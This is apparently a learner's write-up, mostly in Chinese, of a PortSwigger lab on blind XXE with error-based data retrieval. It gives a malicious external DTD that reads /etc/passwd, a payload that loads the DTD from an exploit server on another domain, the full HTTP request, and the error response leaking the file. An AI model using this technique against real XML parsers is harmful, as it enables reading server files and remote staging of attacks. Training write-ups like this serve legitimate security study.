


```
This lab has a "Check stock" feature that parses XML input but does not display the result.

To solve the lab, use an external DTD to trigger an error message that displays the contents of the `/etc/passwd` file.

The lab contains a link to an exploit server on a different domain where you can host your malicious DTD.



這個實驗室有一個“檢查庫存”功能，它解析 XML 輸入但不顯示結果。

要解決實驗室問題，請使用外部 DTD 觸發顯示 `/etc/passwd` 文件內容的錯誤消息。

該實驗室包含指向不同域上的漏洞利用服務器的鏈接，您可以在其中託管惡意 DTD。



```



### 官方給的DTD


```xml

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>"> 
%eval; 
%exfil;

```

說明:

1.定義 file變數 
```
file:///etc/passwd
```


2.定義 eval 字串變數 
```
<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>
```


3.定義 EVAL 字串變數時， file變數 已經被調用所以 eval 字串變數=
```
<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/file:///etc/passwd
;'>
```


4.調用eval 變數的字串剛好定義了 exfil 變數
exfil 變數=
```

SYSTEM 'file:///invalid/file:///etc/passwd'
```


5.調用 exfil 變數，會請求本地檔案
```
file:///invalid/file:///etc/passwd
```



### 官方給的payload:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```




### 整理一下

，DTD 檔最終會請求一段錯誤的本地地址
```
file:///invalid/file:///etc/passwd
```


而它又給了一個可以生成DTD檔的惡意網址。把DTD 放在 body 可以 view response
```
https://exploit-0ab800d803f25730c0fd9c2501a2001a.exploit-server.net/exploit
```



修改paylaod :

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0ab800d803f25730c0fd9c2501a2001a.exploit-server.net/exploit"> %xxe;]>
```

xxe 變數被調用時，會去請求惡意的DTD 檔，



```http
POST /product/stock HTTP/1.1
Host: 0ace00bb03cd5743c09c9c00009700b3.web-security-academy.net
Cookie: session=RY0w0xD7tRhTsFy20aKNhmS8HrT4zdDp
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0
Accept: */*
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: https://0ace00bb03cd5743c09c9c00009700b3.web-security-academy.net/product?productId=2
Content-Type: application/xml
Content-Length: 238
Origin: https://0ace00bb03cd5743c09c9c00009700b3.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close

<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "https://exploit-0ab800d803f25730c0fd9c2501a2001a.exploit-server.net/exploit"> %xxe;]>


<stockcheck>
	<productid>2</productid>
	<storeid>1</storeid>
</stockcheck>


```


response:
```http

HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 1355

"XML parser exited with error: java.io.FileNotFoundException: /invalid/root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin (No such file or directory)"


```


完成。


但我不知道報錯為啥能顯示 file:///etc/passwd  的原理

我猜有可能是目標網站的 config 設置 打開error 的顯示